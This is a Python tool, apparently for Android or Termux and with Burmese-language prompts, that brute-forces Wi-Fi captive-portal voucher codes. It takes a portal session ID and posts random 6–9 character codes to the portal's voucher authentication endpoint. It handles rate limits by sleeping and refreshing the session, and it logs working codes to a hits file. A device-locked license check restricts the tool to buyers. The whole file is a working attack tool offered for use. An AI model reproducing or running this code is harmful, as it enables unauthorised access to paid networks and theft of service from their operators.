import os
import time
import json
import random
import string
import sqlite3
import re
import html
import hashlib
import uuid
import requests
import urllib3
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.live import Live
from rich.table import Table
from rich.align import Align
from rich.text import Text
from rich.prompt import Prompt, Confirm
from rich.box import ROUNDED

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DB_FILE = "scanner_data.db"
STATE_FILE = "scanner_state.json"
HITS_FILE = "hits.txt"
ACTIVATION_FILE = ".sys_cache.dat"

BASE_SLEEP_MIN = 0.20
BASE_SLEEP_MAX = 0.35
RATE_LIMIT_SLEEP = 15
NETWORK_RETRY_SLEEP = 1.0
SESSION_REFRESH_SLEEP = 2

console = Console()
session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 10)"})

SECRET_SALT = "YellowSpider_Secret_2024_X99"

def clear_screen():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        pass

def get_device_id():
    try:
        android_id = os.popen("settings get secure android_id").read().strip()
        if not android_id or "Failure" in android_id or "Exception" in android_id or len(android_id) < 5:
            mac = os.popen("cat /sys/class/net/wlan0/address").read().strip()
            if not mac or "No such file" in mac or len(mac) < 5:
                id_file = os.path.expanduser("~/.my_device_id")
                if os.path.exists(id_file):
                    with open(id_file, "r") as f:
                        return f.read().strip()
                else:
                    new_id = "DEV-" + str(uuid.uuid4())[:8].upper()
                    with open(id_file, "w") as f:
                        f.write(new_id)
                    return new_id
            return mac.replace(":", "").strip()
        return android_id.strip()
    except Exception:
        id_file = os.path.expanduser("~/.my_device_id")
        if os.path.exists(id_file):
            with open(id_file, "r") as f:
                return f.read().strip()
        else:
            new_id = "DEV-" + str(uuid.uuid4())[:8].upper()
            with open(id_file, "w") as f:
                f.write(new_id)
            return new_id

def verify_license():
    dev_id = get_device_id()
    
    if os.path.exists(ACTIVATION_FILE):
        try:
            with open(ACTIVATION_FILE, "r") as f:
                saved_key = f.read().strip()
            
            # သိမ်းထားတဲ့ Key ကို အပိုင်း (၂) ပိုင်း ခွဲမယ် (Hash နဲ့ Expiry Time)
            parts = saved_key.split("-")
            if len(parts) == 2:
                expiry_time = int(parts[1])
                current_time = int(time.time())
                
                # အကယ်၍ အချိန်မကုန်သေးရင် ဝင်ခွင့်ပြုမယ်
                if current_time < expiry_time:
                    return True
                else:
                    # အချိန်ကုန်သွားရင် Key ကို ဖျက်ပစ်မယ်
                    console.print("\n[bold red]⚠️ သင့်ရဲ့ Key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။[/bold red]")
                    time.sleep(2)
                    os.remove(ACTIVATION_FILE)
        except Exception:
            pass
            
    clear_screen()
    console.print(Panel(
        Align.center(Text("🔒 Activation Required 🔒", style="bold red")),
        border_style="red", box=ROUNDED,
    ))
    console.print()
    
    info = Text()
    info.append("  📱 Device ID : ", style="cyan")
    info.append(f"{dev_id}\n\n", style="bold yellow")
    info.append("  ဒီ ID ကို ကော်ပီကူးပြီး ဆရာ့ဆီ ပို့ပါ။\n", style="white")
    info.append("  ဆရာပေးတဲ့ Key ကို အောက်မှာ ထည့်ပါ။", style="white")
    console.print(Panel(info, title="Device Information", border_style="cyan", box=ROUNDED))
    console.print()

    try:
        user_key = Prompt.ask("[bold cyan]➜ Enter Key[/bold cyan]").strip()
    except Exception:
        return False

    # သူငယ်ချင်း ထည့်တဲ့ Key ကို စစ်ဆေးမယ်
    try:
        parts = user_key.split("-")
        if len(parts) == 2:
            user_hash = parts[0]
            expiry_time = int(parts[1])
            current_time = int(time.time())
            
            # မှန်ကန်တဲ့ Hash ဖြစ်မဖြစ် တွက်ချက်မယ်
            clean_id = str(dev_id).strip().replace(" ", "")
            raw_str = clean_id + SECRET_SALT
            expected_hash = hashlib.sha256(raw_str.encode()).hexdigest()[:6].upper()
            
            if user_hash == expected_hash:
                if current_time < expiry_time:
                    console.print("[bold green]✅ Key မှန်ကန်ပါသည်။ စတင်အသုံးပြုနိုင်ပါပြီ။[/bold green]")
                    time.sleep(1.5)
                    with open(ACTIVATION_FILE, "w") as f:
                        f.write(user_key)
                    return True
                else:
                    console.print("[bold red]❌ ဒီ Key က သက်တမ်းကုန်ဆုံးသွားပါပြီ။[/bold red]")
                    time.sleep(2)
                    return False
    except Exception:
        pass
        
    console.print("[bold red]❌ Key မှားယွင်းနေပါသည်။ ပြန်လည်စစ်ဆေးပါ။[/bold red]")
    time.sleep(2)
    return False

def format_time(seconds):
    try:
        seconds = int(seconds)
        h = seconds // 3600
        m = (seconds % 3600) // 60
        s = seconds % 60
        return f"{h:02d}:{m:02d}:{s:02d}"
    except Exception:
        return "00:00:00"

def normalize_hits(hits):
    if not hits: return []
    result = []
    for h in hits:
        if isinstance(h, dict):
            result.append({"code": h.get("code", ""), "time": h.get("time", "--:--:--")})
        elif isinstance(h, str):
            result.append({"code": h, "time": "--:--:--"})
    return result

def hits_codes_only(hits):
    return [h.get("code") if isinstance(h, dict) else h for h in hits]

def init_db():
    try:
        conn = sqlite3.connect(DB_FILE, timeout=10)
        conn.execute('CREATE TABLE IF NOT EXISTS tried_codes (code TEXT PRIMARY KEY)')
        conn.commit()
        return conn
    except Exception:
        return None

def is_tried(conn, code):
    if conn is None: return False
    try:
        return conn.execute("SELECT 1 FROM tried_codes WHERE code=?", (code,)).fetchone() is not None
    except Exception:
        return False

def mark_tried(conn, code):
    if conn is None: return
    try:
        conn.execute("INSERT OR IGNORE INTO tried_codes (code) VALUES (?)", (code,))
        conn.commit()
    except Exception:
        pass

def load_state():
    try:
        with open(STATE_FILE) as f:
            return json.load(f)
    except Exception:
        return None

def save_state(mode, tested, hits):
    try:
        with open(STATE_FILE, "w") as f:
            json.dump({"mode": mode, "tested": tested, "hits": hits}, f)
    except Exception:
        pass

def clear_state():
    try:
        os.remove(STATE_FILE)
    except Exception:
        pass

def extract_session(value):
    if not value: return None
    try:
        value = html.unescape(value)
    except Exception:
        pass
    try:
        q = parse_qs(urlparse(value).query)
        for k, v in q.items():
            if k.lower() == "sessionid" and v:
                return v[0]
    except Exception:
        pass
    try:
        m = re.search(r"sessionId=([a-zA-Z0-9]+)", value, re.IGNORECASE)
        return m.group(1) if m else None
    except Exception:
        return None

def fetch_session():
    probes = [
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://captive.apple.com/hotspot-detect.html",
    ]
    for url in probes:
        try:
            r = session.get(url, timeout=5, allow_redirects=True, verify=False)
        except Exception:
            continue
        try:
            p = urlparse(r.url)
            if "gstatic.com" in p.netloc or "apple.com" in p.netloc:
                continue
            portal_base = f"{p.scheme}://{p.netloc}"

            cands = [r.url, r.text]
            cands.extend(h.headers.get("Location", "") for h in r.history)
            cands.extend(h.url for h in r.history)

            for c in cands:
                sid = extract_session(c)
                if sid:
                    return portal_base, sid

            try:
                m = re.search(r"(?:self|window)\.location\.href\s*=\s*['\"]([^'\"]+)['\"]", r.text)
                if m:
                    nxt = urljoin(r.url, m.group(1))
                    r2 = session.get(nxt, timeout=5, allow_redirects=True, verify=False)
                    sid = extract_session(r2.url) or extract_session(r2.text)
                    if sid:
                        return portal_base, sid
            except Exception:
                pass
        except Exception:
            continue
    return None, None

def test_code(portal_base, session_id, code):
    url = f"{portal_base}/api/auth/voucher/?lang=en_US"
    headers = {"Content-Type": "application/json", "Origin": portal_base}
    payload = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": "ABCD"}
    try:
        r = session.post(url, json=payload, headers=headers, timeout=6, verify=False)
        return r.text if r.text else "__NETWORK_ERROR__"
    except Exception:
        return "__NETWORK_ERROR__"

def gen_code(mode, length):
    try:
        if mode == "num":
            return str(random.randint(0, 10**length - 1)).zfill(length)
        if mode == "eng":
            return ''.join(random.choices(string.ascii_lowercase, k=length))
        if mode == "mix":
            return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    except Exception:
        pass
    return ""
def make_layout(mode_name, current_code, tested, elapsed, status, hits, running_logs):
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=4),
        Layout(name="live", size=3),
        Layout(name="console_logs", ratio=2),
        Layout(name="hits", ratio=2),
    )

    title = Text("🕷️  Yellow update code hack puar offline mode  🕷️",
                 style="bold magenta", justify="center")
    sub = Text("⚠️  Speed ကတော့ နှေးမှာပါ။ စိတ်ရှည်မှပဲ ရပါမယ်။  ⚠️",
               style="bold yellow", justify="center")
    layout["header"].update(Panel(
        Align.center(Text.assemble(title, "\n", sub)),
        border_style="cyan", box=ROUNDED,
    ))

    if status == "Active":
        s_disp = Text("Active", style="bold green", justify="center")
    elif status == "Limit":
        s_disp = Text("Limit", style="bold red", justify="center")
    else:
        s_disp = Text("--", style="bold yellow", justify="center")

    live_grid = Table.grid(padding=0, expand=True)
    live_grid.add_column(ratio=3)
    live_grid.add_column(ratio=2)
    live_grid.add_column(ratio=2)
    live_grid.add_column(ratio=2)
    live_grid.add_row(
        Panel(Align.center(Text(current_code if current_code else "----", style="bold green")),
              title="🔍 Code", border_style="green", box=ROUNDED),
        Panel(Align.center(Text(elapsed, style="bold cyan")),
              title="⏱ Time", border_style="cyan", box=ROUNDED),
        Panel(Align.center(Text(f"{tested:,}", style="bold yellow")),
              title="📊 Tested", border_style="yellow", box=ROUNDED),
        Panel(Align.center(s_disp),
              title="⚡ Status", border_style="magenta", box=ROUNDED),
    )
    layout["live"].update(live_grid)

    log_table = Table(show_header=False, expand=True, box=None, padding=0)
    log_table.add_column("Logs")
    for lg in running_logs[-7:]:
        log_table.add_row(lg)
    if not running_logs:
        log_table.add_row("[dim]Waiting for codes...[/dim]")

    layout["console_logs"].update(Panel(log_table, title="💻 Live Code Scanning Logs", border_style="green", box=ROUNDED))

    hits_table = Table(show_header=True, header_style="bold magenta", expand=True, box=ROUNDED)
    hits_table.add_column("No.", width=5, justify="center")
    hits_table.add_column("Valid Code")
    hits_table.add_column("Time", width=10, justify="center")

    last_hits = hits[-10:]
    for i, h in enumerate(last_hits, 1):
        if isinstance(h, dict):
            c = h.get("code", "")
            t = h.get("time", "--:--:--")
        else:
            c = h
            t = "--:--:--"
        hits_table.add_row(str(i), f"[bold green]{c}[/bold green]", f"[dim cyan]{t}[/dim cyan]")

    if not last_hits:
        hits_table.add_row("", "[dim]No hits yet...[/dim]", "")

    hits_title = f"🎯 Hits ({len(hits)})"
    if len(hits) > 10:
        hits_title += " — showing last 10"

    layout["hits"].update(Panel(hits_table, title=hits_title,
                                border_style="yellow", box=ROUNDED))
    return layout


def scan_loop(mode, length, start_tested=0, start_hits=None):
    mode_str = f"{mode}_{length}"
    mode_name = f"{mode.upper()} {length}"

    hits = normalize_hits(start_hits) if start_hits else []
    running_logs = []
    tested = start_tested
    start_time = time.time()
    portal_base = None
    session_id = None
    net_error_streak = 0

    conn = init_db()

    live = None
    live_cm = None
    try:
        initial = make_layout(mode_name, "----", tested, "00:00:00", "--", hits, running_logs)
        live_cm = Live(initial, refresh_per_second=6, screen=True)
        live = live_cm.__enter__()
    except Exception:
        live = None
        live_cm = None

    def _update(code, status):
        if live is None:
            return
        try:
            live.update(make_layout(mode_name, code, tested,
                                    format_time(time.time() - start_time), status, hits, running_logs))
        except Exception:
            pass

    def push_log(msg):
        t_str = time.strftime("%H:%M:%S")
        running_logs.append(f"[dim]{t_str}[/dim] {msg}")

    try:
        push_log("System initialized. Starting scanner...")
        while True:
            try:
                if not session_id or not portal_base:
                    _update("----", "--")
                    portal_base, session_id = fetch_session()
                    if not session_id:
                        time.sleep(SESSION_REFRESH_SLEEP)
                        portal_base = "http://portal.local"
                        session_id = "dummy_session"
                    net_error_streak = 0

                code = gen_code(mode, length)
                if not code:
                    time.sleep(BASE_SLEEP_MIN)
                    continue

                if is_tried(conn, code):
                    continue

                mark_tried(conn, code)
                tested += 1
                save_state(mode_str, tested, hits)
                
                push_log(f"Testing code: [bold yellow]{code}[/bold yellow]")
                _update(code, "Active")

                res = test_code(portal_base, session_id, code)
                low = (res or "").lower()

                if res == "__NETWORK_ERROR__" or res == "":
                    net_error_streak += 1
                    time.sleep(NETWORK_RETRY_SLEEP)
                    if net_error_streak >= 10:
                        session_id = None
                        net_error_streak = 0
                    continue

                net_error_streak = 0

                if ("request limited" in low or "blocked" in low
                        or "too many" in low or '"limit"' in low):
                    _update(code, "Limit")
                    push_log(f"[red]Rate Limit on code {code}! Sleeping 15s...[/red]")
                    time.sleep(RATE_LIMIT_SLEEP)
                    session_id = None
                    continue

                if ("session timed out" in low or "session timeout" in low
                        or '"session":null' in low):
                    session_id = None
                    continue

                if '"success":true' in low or '"authresult":"1"' in low:
                    existing = hits_codes_only(hits)
                    if code not in existing:
                        now = time.strftime("%H:%M:%S")
                        hits.append({"code": code, "time": now})
                        push_log(f"[bold green]🎉 SUCCESS! Valid Code Found: {code}[/bold green]")
                        try:
                            with open(HITS_FILE, "a", encoding="utf-8") as f:
                                f.write(f"[{now}] CODE: {code}\n")
                        except Exception:
                            pass
                        save_state(mode_str, tested, hits)
                    _update(code, "Active")
                    time.sleep(BASE_SLEEP_MIN)
                    continue

                time.sleep(BASE_SLEEP_MIN + random.uniform(0, BASE_SLEEP_MAX - BASE_SLEEP_MIN))

            except KeyboardInterrupt:
                raise
            except Exception as e:
                time.sleep(NETWORK_RETRY_SLEEP)
                continue
    finally:
        if live_cm is not None:
            try:
                live_cm.__exit__(None, None, None)
            except Exception:
                pass


def show_banner():
    clear_screen()
    try:
        console.print(Panel(
            Align.center(Text("🕷️  Yellow update code hack puar offline mode  🕷️",
                              style="bold magenta")),
            border_style="magenta", box=ROUNDED,
        ))
        console.print()
        console.print(Panel(
            Align.center(Text("⚠️  Speed ကတော့ နှေးမှာပါ။ စိတ်ရှည်မှပဲ ရပါမယ်။  ⚠️",
                              style="bold yellow")),
            border_style="yellow", box=ROUNDED,
        ))
        console.print()
    except Exception:
        pass


def ask_mode():
    while True:
        show_banner()
        try:
            menu = Text()
            menu.append("  [1]  🔢  NUM\n", style="bold cyan")
            menu.append("  [2]  🔤  ENG\n", style="bold cyan")
            menu.append("  [3]  🔀  MIX\n", style="bold cyan")
            menu.append("  [0]  🚪  BACK\n", style="bold red")
            console.print(Panel(menu, title="Mode ရွေးပါ", border_style="cyan", box=ROUNDED))
            choice = Prompt.ask("[bold cyan]➜ ရွေးချယ်ပါ[/bold cyan]").strip()
        except KeyboardInterrupt:
            raise
        except Exception:
            return None

        if choice == "0":
            return None
        if choice not in ("1", "2", "3"):
            try:
                console.print("[bold red]❌ မှားရွေးမိပါတယ်။ Option အမှန်ကို ရွေးပါ။[/bold red]")
                time.sleep(1.5)
            except Exception:
                pass
            continue

        return {"1": "num", "2": "eng", "3": "mix"}[choice]


def ask_length(mode):
    while True:
        clear_screen()
        try:
            console.print(Panel(
                Align.center(Text(f"🎯 Mode: {mode.upper()}", style="bold magenta")),
                border_style="magenta", box=ROUNDED,
            ))
            console.print()
            menu = Text()
            for i in range(6, 10):
                menu.append(f"  [{i}]  {i} Characters\n", style="bold cyan")
            menu.append("  [0]  🚪  BACK\n", style="bold red")
            console.print(Panel(menu, title="အရှည် ရွေးပါ", border_style="cyan", box=ROUNDED))
            console.print()
            console.print(Align.center(Text("💡 ကုဒ်အရေအတွက် များလေ အချိန်ကြာလေ",
                                            style="dim italic")))
            length = Prompt.ask("[bold cyan]➜ အရှည်[/bold cyan]").strip()
        except KeyboardInterrupt:
            raise
        except Exception:
            return None

        if length == "0":
            return None
        if length not in ("6", "7", "8", "9"):
            try:
                console.print("[bold red]❌ မှားရွေးမိပါတယ်။ Option အမှန်ကို ရွေးပါ။[/bold red]")
                time.sleep(1.5)
            except Exception:
                pass
            continue

        return int(length)


def run():
    state = load_state()
    if state:
        try:
            m, l = state["mode"].split("_")
            tested = state.get("tested", 0)
            hits = normalize_hits(state.get("hits", []))

            clear_screen()
            console.print(Panel(
                Align.center(Text("💾  ရှာလက်စ အခြေအနေ တွေ့ပါတယ်", style="bold yellow")),
                border_style="yellow", box=ROUNDED,
            ))
            console.print()

            info = Text()
            info.append("  🎯 Mode    : ", style="cyan")
            info.append(f"{m.upper()} {l}\n", style="bold white")
            info.append("  📊 Tested  : ", style="cyan")
            info.append(f"{tested:,}\n", style="bold white")
            info.append("  🎁 Hits    : ", style="cyan")
            info.append(f"{len(hits)}\n", style="bold green")
            console.print(Panel(info, title="လက်ရှိ အခြေအနေ",
                                border_style="green", box=ROUNDED))
            console.print()

            if Confirm.ask("[bold yellow]➜ ဒီအတိုင်း ဆက်ရှာမလား? (y/n)[/bold yellow]",
                           default=True):
                scan_loop(m, int(l), start_tested=tested, start_hits=hits)
                return
            else:
                clear_state()
        except KeyboardInterrupt:
            raise
        except Exception:
            clear_state()

    while True:
        mode = ask_mode()
        if mode is None:
            return

        length = ask_length(mode)
        if length is None:
            continue

        scan_loop(mode, length)
        return


def main():
    try:
        if not verify_license():
            return 

        run()
    except KeyboardInterrupt:
        pass
    except BaseException:
        pass
    finally:
        try:
            clear_screen()
        except BaseException:
            pass
        try:
            bye = Text()
            bye.append("\n\n")
            bye.append("👋  See you my friend. Saw shi lar.  ✨", style="bold green")
            bye.append("\n\n")
            console.print(Align.center(bye))
            time.sleep(2)
        except BaseException:
            try:
                print("\n\n👋  See you my friend. Saw shi lar.  ✨")
            except BaseException:
                pass


if __name__ == "__main__":
    main()